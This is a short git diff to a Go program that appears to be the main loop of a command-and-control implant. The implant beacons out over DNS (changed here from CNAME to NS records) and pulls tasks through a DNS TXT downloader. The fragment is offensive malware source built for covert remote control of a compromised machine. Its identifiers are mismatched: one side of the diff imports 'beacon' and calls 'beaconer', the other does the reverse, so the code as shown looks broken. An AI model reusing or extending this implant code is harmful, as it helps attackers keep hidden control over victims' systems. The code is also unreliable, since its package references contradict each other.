@@ -4,7 +4,7 @@ import (
 	"math/rand"
 	"time"
 
-	"github.com/averagesecurityguy/c2/beacon"
+	"github.com/averagesecurityguy/c2/beaconer"
 	"github.com/averagesecurityguy/c2/downloader"
 )
 
@@ -17,7 +17,7 @@ const sleep = 1   // In seconds
 func main() {
 	sysid := "uuid"
 	checkIn := time.Now()
-	beacon := beaconer.NewDnsCnameBeacon(sysid, domain)
+	beacon := beacon.NewDnsNsBeacon(sysid, domain)
 	downloader := downloader.NewDnsTxtDownloader()
 
 	for {
